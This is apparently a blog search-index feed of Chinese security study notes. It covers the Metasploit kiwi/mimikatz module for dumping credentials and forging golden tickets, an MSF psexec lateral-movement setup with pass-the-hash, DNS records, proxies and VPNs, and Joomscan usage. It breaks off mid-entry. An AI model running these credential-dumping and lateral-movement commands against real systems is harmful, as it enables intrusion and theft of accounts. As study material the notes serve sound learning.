<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>KiWi模块</title>
      <link href="/2024/04/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF-kiwi%E6%A8%A1%E5%9D%97/"/>
      <url>/2024/04/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/MSF-kiwi%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="MSF-kiwi模块"><a href="#MSF-kiwi模块" class="headerlink" title="MSF-kiwi模块"></a>MSF-kiwi模块</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>kiwi模块：<br>  mimikatz模块已经合并为kiwi模块；使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system</p><p>进程迁移：<br>  kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。<br>  所以如果目标系统是64位的，则必须先查看系统进程列表（tasklist），然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><h2 id="msf进行进程迁移："><a href="#msf进行进程迁移：" class="headerlink" title="msf进行进程迁移："></a>msf进行进程迁移：</h2><p>把进程迁移到PID为504这个程序中(因为当前用户)：<br>注：因为目标系统是64位的所以需要把meterpreter进程迁移到一个64位程序的进程中。  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令：</span><br><span class="line">migrate [PID]</span><br></pre></td></tr></table></figure><h2 id="模块使用前提："><a href="#模块使用前提：" class="headerlink" title="模块使用前提："></a>模块使用前提：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提到system有两个方法：</span><br><span class="line">  一是当前的权限是administrator用户；</span><br><span class="line">  二是利用其它手段先提权到administrator用户。</span><br><span class="line">然后administrator用户可以直接在meterpreter_shell中使用命令getsystem提权到system权限。</span><br></pre></td></tr></table></figure><h2 id="kiwi模块使用："><a href="#kiwi模块使用：" class="headerlink" title="kiwi模块使用："></a>kiwi模块使用：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi #加载kiwi模块</span><br><span class="line">help kiwi #查看kiwi模块的使用</span><br><span class="line">creds_all：             #列举所有凭据</span><br><span class="line">creds_kerberos：        #列举所有kerberos凭据</span><br><span class="line">creds_msv：             #列举所有msv凭据</span><br><span class="line">creds_ssp：             #列举所有ssp凭据</span><br><span class="line">creds_tspkg：           #列举所有tspkg凭据</span><br><span class="line">creds_wdigest：         #列举所有wdigest凭据</span><br><span class="line">dcsync：                #通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：           #通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：  #创建黄金票据</span><br><span class="line">kerberos_ticket_list：  #列举kerberos票据</span><br><span class="line">kerberos_ticket_purge： #清除kerberos票据</span><br><span class="line">kerberos_ticket_use：   #使用kerberos票据</span><br><span class="line">kiwi_cmd：              #执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：          #dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：      #dump出lsa的密文</span><br><span class="line">password_change：       #修改密码</span><br><span class="line">wifi_list：             #列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：      #列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><h2 id="俩个常用的命令："><a href="#俩个常用的命令：" class="headerlink" title="俩个常用的命令："></a>俩个常用的命令：</h2><p>creds_all：<br>列举系统所有明文密码，列举所有凭据</p><p>‍</p><p>kiwi_cmd：<br>kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe的命令  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用kiwi抓取明文密码：</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> KiWi模块 </tag>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PSexec原理</title>
      <link href="/2024/04/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/PSexec%E5%8E%9F%E7%90%86/"/>
      <url>/2024/04/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/PSexec%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="PSexec原理"><a href="#PSexec原理" class="headerlink" title="PSexec原理"></a>PSexec原理</h1><p>​<code>PsExec</code>​ 是一个Windows工具，它是Sysinternals套件的一部分，现在由微软提供。它被广泛用于远程执行程序，特别是在系统管理和网络测试中。<code>PsExec</code>​在横向移动（即在一个网络内部从一个节点到另一个节点移动）中的角色和原理可以这样概括：</p><ol><li><strong>远程执行命令</strong>: <code>PsExec</code>​ 允许用户在远程系统上执行程序和命令，就好像它们是在本地执行一样。这对于系统管理员来说是一个强大的功能，因为它允许他们在整个网络中的计算机上执行任务，而不必物理地在每台机器前操作。</li><li><strong>使用Windows管理共享</strong>: <code>PsExec</code>​ 通常通过网络使用 Windows 管理共享（如 <code>ADMIN$</code>​）来运行程序。<code>ADMIN$</code>​ 是一个默认共享，通常指向远程系统的 <code>C:\Windows</code>​ 目录。</li><li><strong>身份验证机制</strong>: 使用 <code>PsExec</code>​ 时，用户必须对远程系统进行身份验证。这通常涉及到提供远程系统上有效用户的用户名和密码。在某些配置中，它也可以利用已有的网络凭据（如通过 Windows 域认证）。</li><li><strong>复制和执行</strong>: <code>PsExec</code>​ 先将要执行的程序复制到远程系统的 <code>ADMIN$</code>​ 共享，然后在远程系统上执行该程序。</li><li><strong>清理</strong>: 执行完成后，<code>PsExec</code>​ 会尝试清理它在远程系统上创建的任何文件。</li></ol><p>在网络安全领域，<code>PsExec</code>​ 也被恶意软件和攻击者用来实现横向移动。由于其能力强大且易于使用，攻击者经常利用它在已经被渗透的网络中移动，寻找数据和扩大攻击范围。因此，对于网络管理员来说，监控 <code>PsExec</code>​ 的使用并理解其工作原理是非常重要的，以便于检测和防止未经授权的使用。</p><p>为了安全地使用 <code>PsExec</code>​，强烈建议仅在必要时使用，并始终确保使用强密码和适当的网络安全措施。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MSF：</span><br><span class="line">#进行攻击前，先获取一个会话</span><br><span class="line">#添加目标子网路由</span><br><span class="line">route add 10.10.10.0 255.255.255.0 8</span><br><span class="line">#挂代理</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">show options</span><br><span class="line">#配置模块选项，包括 RHOSTS（远程主机地址）、SMBUser（用户名）、SMBPass（密码）或 SMBDomain（域，如果适用）。例如：</span><br><span class="line">set RHOSTS 192.168.1.101</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass password123</span><br><span class="line">#如果您有一个有效的 Windows 系统的哈希（通常是NTLM哈希），您也可以使用它：</span><br><span class="line">set SMBPass <span class="tag">&lt;<span class="name">LM哈希</span>&gt;</span>:<span class="tag">&lt;<span class="name">NTLM哈希</span>&gt;</span></span><br><span class="line">#根据目标系统和您的需要选择一个合适的有效载荷。例如，对于一个 Windows 目标，您可以使用：</span><br><span class="line">set PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">set LHOST [您的IP地址]</span><br><span class="line">set LPORT [监听端口]</span><br><span class="line">#一旦所有必要的选项都已设置，使用以下命令运行模块：</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> MSF </tag>
            
            <tag> PSexec原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名记录</title>
      <link href="/2024/04/23/%E7%BD%91%E7%BB%9C%E6%95%B0%E9%80%9A/A%E8%AE%B0%E5%BD%95%EF%BC%8CAAAA%E8%AE%B0%E5%BD%95%EF%BC%8CCNAME%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/04/23/%E7%BD%91%E7%BB%9C%E6%95%B0%E9%80%9A/A%E8%AE%B0%E5%BD%95%EF%BC%8CAAAA%E8%AE%B0%E5%BD%95%EF%BC%8CCNAME%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="A记录，AAAA记录，CNAME记录"><a href="#A记录，AAAA记录，CNAME记录" class="headerlink" title="A记录，AAAA记录，CNAME记录"></a>A记录，AAAA记录，CNAME记录</h1><p>A，AAAA 记录和 CNAME 记录都是 DNS 解析中常用的记录类型。</p><h3 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h3><p>A记录是一种DNS（Domain Name System）记录类型，它将域名解析为IPv4地址。A记录用于指定与特定域名相关联的IPv4地址。</p><p>当用户在浏览器中输入一个域名时，计算机需要将该域名转换为对应的IP地址，以便建立与服务器的连接。这就是DNS的工作原理，而A记录就是其中最常见的记录类型之一。</p><p>示例：假设有一个域名example.com需要解析为IPv4地址，可以添加如下A记录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主机名: example.com.</span><br><span class="line">记录类型: A</span><br><span class="line">记录值: 192.0.2.1</span><br></pre></td></tr></table></figure><h3 id="AAAA-记录（也称为-IPv6-记录）"><a href="#AAAA-记录（也称为-IPv6-记录）" class="headerlink" title="AAAA 记录（也称为 IPv6 记录）"></a>AAAA 记录（也称为 IPv6 记录）</h3><p>用于将域名解析为 IPv6 地址。它们是 IPv4 地址的扩展，用于适应 IPv6 协议的需求。AAAA 记录在支持 IPv6 的网络环境中使用。</p><p>示例：假设有一个域名 example.com 需要解析为 IPv6 地址，可以添加如下 AAAA 记录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: example.com.</span><br><span class="line">Type: AAAA</span><br><span class="line">Value: 2001:0db8:85a3:0000:0000:8a2e:0370:7334</span><br></pre></td></tr></table></figure><h3 id="CNAME-记录（也称为别名记录）"><a href="#CNAME-记录（也称为别名记录）" class="headerlink" title="CNAME 记录（也称为别名记录）"></a>CNAME 记录（也称为别名记录）</h3><p>用于将一个域名指向另一个域名。它允许多个域名共享相同的 IP 地址或服务器配置，从而简化管理和维护。</p><p>示例：假设有一个域名 <a href="http://www.example.com/">www.example.com</a> 需要指向 example.com，可以添加如下 CNAME 记录：</p><p>‍</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: www.example.com.</span><br><span class="line">Type: CNAME</span><br><span class="line">Value: example.com.</span><br></pre></td></tr></table></figure><p>通过使用 CNAME 记录，当用户访问 <a href="http://www.example.com/">www.example.com</a> 时，DNS 会将其解析为 example.com，并返回后者的 IP 地址。</p><p>请注意，确保正确配置 AAA 记录和 CNAME 记录以及目标地址的准确性，以确保域名解析的正确性。</p><h3 id="邮箱记录通常是指MX记录（Mail-Exchanger-Record）"><a href="#邮箱记录通常是指MX记录（Mail-Exchanger-Record）" class="headerlink" title="邮箱记录通常是指MX记录（Mail Exchanger Record）"></a>邮箱记录通常是指MX记录（Mail Exchanger Record）</h3><p>它用于指定接收该域名邮件的邮件服务器。<br>当有人向该域名发送电子邮件时，电子邮件服务器需要知道应该将邮件传递给哪个邮件服务器处理。这就是MX记录的作用。<br>示例：假设有一个域名example.com，并且希望将邮件发送到mail.example.com这个邮件服务器上，可以添加如下MX记录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主机名: example.com.</span><br><span class="line">记录类型: MX</span><br><span class="line">优先级: 10</span><br><span class="line">记录值: mail.example.com.</span><br></pre></td></tr></table></figure><p>在上面的示例中，MX记录指定了邮件服务器的优先级为10，表示当有多个MX记录时，具有较低数字的优先级会被优先选择。记录值指定了目标邮件服务器的主机名。<br>请注意，MX记录只能指定邮件服务器的主机名，而不是IP地址。因此，在设置MX记录之前，确保您已经正确配置了邮件服务器并拥有相应的主机名。<br>同时，还可以设置多个MX记录以实现备份和负载均衡。当一台邮件服务器无法接收邮件时，邮件会发送到下一个优先级较高的邮件服务器。<br>最后，修改MX记录后可能需要一些时间才能在全球范围内生效，这是由DNS缓存机制决定的。</p><p>因此，在更改MX记录后，可能需要等待一段时间才能确保邮件的正常传递。<br>总结来说，MX记录用于指定接收特定域名邮件的邮件服务器。通过正确设置MX记录，可以确保电子邮件能够正确地发送到目标邮件服务器上。</p><h3 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h3><p>在域名中存储任意文本信息。它通常被用于验证域名所有权、设置DKIM（DomainKeys Identified Mail）等邮件认证，以及提供其他与域名相关的文本信息。</p><p>示例：假设有一个域名example.com，并且需要添加一条TXT记录来验证域名所有权，可以添加如下TXT记录：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">主机名: example.com.</span><br><span class="line">记录类型: TXT</span><br><span class="line">记录值: &quot;verification_code&quot;</span><br></pre></td></tr></table></figure><p>在上述示例中，将”verification_code”作为TXT记录的记录值。这个值可以是由域名注册商或验证服务提供商提供的特定验证代码或标识符。通过将该TXT记录添加到域名的DNS配置中，可以完成域名所有权的验证过程。</p><p>除了域名验证外，TXT记录还可用于其他目的，例如在电子邮件服务器上设置SPF（Sender Policy Framework）记录，以指定允许发送电子邮件的授权服务器列表。此外，也可以在DKIM设置中使用TXT记录，以支持对发件人域的邮件身份验证。</p><p>请注意，不同的服务提供商和应用程序可能对TXT记录的格式和要求有所不同。因此，在设置TXT记录时，请根据具体的需求和服务提供商的指南进行正确的配置。</p><p>总结来说，TXT记录是一种用于存储任意文本信息的DNS记录类型。它通常用于域名验证、邮件认证和其他与域名相关的配置。</p><h3 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h3><p>域名的历史记录指的是该域名在过去的时间内所经历的变更和活动。虽然每个域名的历史记录都是唯一的，但是普通用户无法直接查看完整的域名历史记录，因为这些记录通常由域名注册商和WHOIS数据库维护。</p><p>以下是一些常见的域名历史记录：</p><ol><li>注册日期：域名的注册日期是指该域名第一次被注册的日期。这是域名历史中最早的一条记录，可以表明域名的年龄和存在时间。</li><li>所有者变更：域名所有者的变更记录了在过去的时间内所有权的转移。当一位域名所有者将域名转让给另一位所有者时，会发生所有者变更。这种记录通常包括所有者的姓名、联系信息和注册日期。</li><li>DNS记录变更：域名的DNS记录指定了与之相关联的IP地址、邮件服务器等信息。当域名的DNS记录发生变更时，例如修改A记录、MX记录、CNAME记录等，都会在历史记录中留下相应的变更记录。</li><li>域名过期和删除：如果域名持有人未及时续费域名注册，该域名可能会过期并最终被删除。域名的过期和删除记录在历史记录中可见。</li><li>WHOIS查询记录：WHOIS数据库是用于查询和存储域名注册信息的公共数据库。每次进行WHOIS查询都会生成一条记录，记录了查询的时间、请求者的IP地址等信息。</li></ol><p>‍</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络数通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 域名记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络协议</title>
      <link href="/2024/04/23/%E7%BD%91%E7%BB%9C%E6%95%B0%E9%80%9A/%E5%8D%8F%E8%AE%AE%E7%B1%BB/"/>
      <url>/2024/04/23/%E7%BD%91%E7%BB%9C%E6%95%B0%E9%80%9A/%E5%8D%8F%E8%AE%AE%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="协议类"><a href="#协议类" class="headerlink" title="协议类"></a>协议类</h1><h3 id="socks5协议"><a href="#socks5协议" class="headerlink" title="socks5协议"></a>socks5协议</h3><p>SOCKS是一种网络协议，用于在客户端和服务器之间进行代理传输。SOCKS5是SOCKS协议的第五个版本，它提供了更多的功能和安全性。</p><p>以下是SOCKS5协议的一些关键特点和详细解释：</p><ol><li><strong>代理功能：</strong>  SOCKS5协议允许客户端通过代理服务器发送和接收数据。客户端与代理服务器建立连接后，可以使用该连接来转发所有的网络请求和响应。</li><li><strong>认证机制：</strong>  SOCKS5支持多种认证方式，包括无身份验证、用户名&#x2F;密码认证以及GSS-API（通用安全服务应用程序接口）认证。这样可以根据需要选择合适的认证方式来保护代理服务器的安全性。</li><li><strong>支持TCP和UDP协议：</strong>  SOCKS5协议不仅支持传输控制协议（TCP），还可以通过UDP协议进行数据传输。这使得它可以适用于各种网络应用，如Web浏览器、邮件客户端、FTP客户端等。</li><li><strong>远程DNS解析：</strong>  SOCKS5协议支持远程DNS解析。当客户端需要进行域名解析时，它可以将DNS查询发送到代理服务器，并由代理服务器代为解析，从而隐藏客户端的真实IP地址。</li><li><strong>支持IPv6：</strong>  SOCKS5协议具备对IPv6的天然支持。它可以处理IPv6的地址和数据包，使得能够与IPv6网络进行通信。</li><li><strong>安全性增强：</strong>  SOCKS5协议引入了一些安全机制来提高数据传输的安全性。其中包括基于用户名&#x2F;密码的认证、加密传输以及可选的数据完整性验证。</li></ol><p>总体而言，SOCKS5协议提供了一种灵活且安全的方式来进行代理传输。无论是用于绕过网络限制、隐藏真实身份还是提供更好的隐私保护，SOCKS5都是一种常用的协议选择</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>客户端—-（代理）—服务器</p><p>在互联网中，协议是用于在计算机网络上进行通信和数据交换的规则和约定。而代理（Proxy）是指位于客户端和服务器之间的中间实体，它充当着两者之间的中转或者代表。在这个角色下，代理通过接收和发送网络请求来屏蔽和保护客户端和服务器之间的直接通信。</p><p>代理可以有多种类型，包括：</p><ol><li>正向代理（Forward Proxy）：正向代理服务于客户端，它代表客户端发送请求到互联网上的服务器。客户端通过连接到正向代理来访问被代理的资源，而服务器并不知道客户端的真实身份，只知道请求来自代理。</li><li>反向代理（Reverse Proxy）：反向代理服务于服务器端，它代表服务器接收客户端发起的请求，并将请求转发给合适的后端服务器。客户端对于整个传输过程是透明的，只与反向代理进行通信。反向代理可以提供负载均衡、安全性等功能。</li><li>透明代理（Transparent Proxy）：透明代理在客户端和服务器之间进行流量转发，但其存在是对客户端透明的，客户端无需配置任何特殊设置即可与服务器通信。透明代理的作用主要在于优化网络性能和提供缓存功能。</li></ol><p>通过使用代理，可以实现一些重要的功能，例如：</p><ul><li>提高安全性：代理可以过滤和阻挡恶意或不安全的网络流量，保护客户端和服务器免受攻击。</li><li>加速访问速度：代理可以缓存数据以减少对服务器的请求，从而提高响应速度。</li><li>负载均衡：反向代理可以将请求分发到多个后端服务器上，平衡服务器的负载，提高整体性能和可靠性。</li><li>隐藏真实身份：正向代理可以隐藏客户端的真实IP地址和身份信息，增加匿名性。</li></ul><p>总之，代理在互联网中扮演着重要的角色，通过屏蔽和转发网络请求，提供了更安全、高效和可靠的通信环境。</p><h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>VPN（Virtual Private Network，虚拟私人网络）协议是一组规则和协议，用于建立和维护通过公共互联网连接的安全、私密的网络通信。它们允许远程用户或不同地理位置的网络设备之间建立加密的通信连接，以保护数据的隐私和安全。以下是一些常见的VPN协议和它们的理解：</p><ol><li><p><strong>PPTP（Point-to-Point Tunneling Protocol）</strong> ：</p><ul><li>PPTP是一种较早的VPN协议，它创建一个点对点的隧道，用于将数据传输加密。</li><li>它的优点是易于设置，但它的安全性相对较低，因此不适合对安全性要求很高的应用。</li></ul></li><li><p><strong>L2TP&#x2F;IPsec（Layer 2 Tunneling Protocol&#x2F;IP Security）</strong> ：</p><ul><li>L2TP通过创建一个点对点的连接，将数据封装在IPsec加密中来提高安全性。</li><li>这种协议提供了更好的安全性，但可能会增加一些网络开销。</li></ul></li><li><p><strong>OpenVPN</strong>：</p><ul><li>OpenVPN是一个开源的VPN协议，具有高度的可配置性和安全性。</li><li>它可以在各种操作系统上使用，包括Windows、Linux和iOS等。</li></ul></li><li><p><strong>SSTP（Secure Socket Tunneling Protocol）</strong> ：</p><ul><li>SSTP使用SSL（安全套接层）加密来创建VPN连接，通常在Windows平台上使用。</li><li>由于使用了SSL，它被认为是一种相对安全的VPN协议。</li></ul></li><li><p><strong>IKEv2&#x2F;IPsec（Internet Key Exchange version 2&#x2F;IP Security）</strong> ：</p><ul><li>IKEv2是一种快速建立连接的协议，通常在移动设备上使用，因为它支持快速漫游。</li><li>它与IPsec结合使用以提供高级的加密和安全性。</li></ul></li></ol><p>不同的VPN协议适用于不同的用例和安全需求。您可以选择基于您的需求和设备支持的协议来配置VPN连接。通常，为了获得最佳的安全性和性能，IPsec、OpenVPN和IKEv2等协议被广泛使用。</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 网络数通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 网络数通 </tag>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joomscan</title>
      <link href="/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Joomscan/"/>
      <url>/2024/04/22/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Joomscan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Joomscan"><a href="#Joomscan" class="headerlink" title="Joomscan"></a>Joomscan</h1><p>joomscan介绍:</p><p>Joomscan 是一款基于 Perl 语言开发的 Joomla 漏洞扫描工具，能够自动扫描 Joomla 网站并检测出其中的漏洞。它可以扫描 Joomla 的各个版本，并且支持多种漏洞扫描模式，包括 SQL 注入、文件包含、文件上传等多种漏洞类型。本文将介绍 Joomscan 的基本用法、常用参数以及一些实例</p><p>CMS框架joomla专用漏扫工具</p><h2 id="Joomscan-的基本用法"><a href="#Joomscan-的基本用法" class="headerlink" title="Joomscan 的基本用法"></a>Joomscan 的基本用法</h2><p>Joomscan的基本用法非常简单，只需要在终端中输入以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u &lt;url&gt;</span><br></pre></td></tr></table></figure><p>其中， 是需要扫描的 Joomla 网站的地址。例如，要扫描 这个网站，可以输入以下命令：<code>&lt;url&gt;http://example.com</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com</span><br></pre></td></tr></table></figure><p>这个命令会自动扫描该网站，并输出扫描结果。扫描结果包括 Joomla 的版本信息、已知的漏洞信息、可能存在的漏洞信息等。</p><h2 id="Joomscan-的常用参数"><a href="#Joomscan-的常用参数" class="headerlink" title="Joomscan 的常用参数"></a>Joomscan 的常用参数</h2><p>Joomscan 还支持一些常用的参数，可以用来控制扫描的方式和输出的内容。下面是一些常用的参数：</p><ul><li>​<code>-a</code>​：扫描所有漏洞类型。</li><li>​<code>-e</code>​：只扫描指定的漏洞类型，例如 表示只扫描 SQL 注入漏洞。<code>-e sqli</code>​</li><li>​<code>-x</code>​：输出 XML 格式的扫描结果。</li><li>​<code>-t</code>​：设置扫描的线程数，默认为 1。</li><li>​<code>-v</code>​：显示详细的扫描结果。</li></ul><p>例如，要扫描 这个网站，并只扫描 SQL 注入漏洞，可以输入以下命令：<code>http://example.com</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com -e sqli</span><br></pre></td></tr></table></figure><h2 id="Joomscan-的实例"><a href="#Joomscan-的实例" class="headerlink" title="Joomscan 的实例"></a>Joomscan 的实例</h2><p>下面是一些 Joomscan 的实例，包括常见的漏洞类型和对应的扫描结果。</p><h3 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h3><p>SQL 注入漏洞是一种常见的漏洞类型，可以导致数据库被攻击者非法访问或者篡改。Joomscan 可以自动扫描 Joomla 网站中的 SQL 注入漏洞，并输出相应的扫描结果。</p><p>例如，要扫描 这个网站中的 SQL 注入漏洞，可以输入以下命令：<code>http://example.com</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com -e sqli</span><br></pre></td></tr></table></figure><p>扫描结果会显示出该网站中存在的 SQL 注入漏洞，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] SQL Injection vulnerability in com_contenthistory</span><br><span class="line">[+] SQL Injection vulnerability in com_contenthistory</span><br><span class="line">[+] SQL Injection vulnerability in com_fields</span><br><span class="line">[+] SQL Injection vulnerability in com_fields</span><br></pre></td></tr></table></figure><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>文件包含漏洞是一种常见的漏洞类型，可以导致攻击者读取或者执行网站上的敏感文件。Joomscan 可以自动扫描 Joomla 网站中的文件包含漏洞，并输出相应的扫描结果。</p><p>例如，要扫描 这个网站中的文件包含漏洞，可以输入以下命令：<code>http://example.com</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com -e lfi</span><br></pre></td></tr></table></figure><p>扫描结果会显示出该网站中存在的文件包含漏洞，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Local File Inclusion vulnerability in com_mailto</span><br><span class="line">[+] Local File Inclusion vulnerability in com_mailto</span><br><span class="line">[+] Local File Inclusion vulnerability in com_weblinks</span><br><span class="line">[+] Local File Inclusion vulnerability in com_weblinks</span><br></pre></td></tr></table></figure><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞是一种常见的漏洞类型，可以导致攻击者上传恶意文件并执行。Joomscan 可以自动扫描 Joomla 网站中的文件上传漏洞，并输出相应的扫描结果。</p><p>例如，要扫描 这个网站中的文件上传漏洞，可以输入以下命令：<code>http://example.com</code>​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://example.com -e upload</span><br></pre></td></tr></table></figure><p>扫描结果会显示出该网站中存在的文件上传漏洞，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Arbitrary File Upload 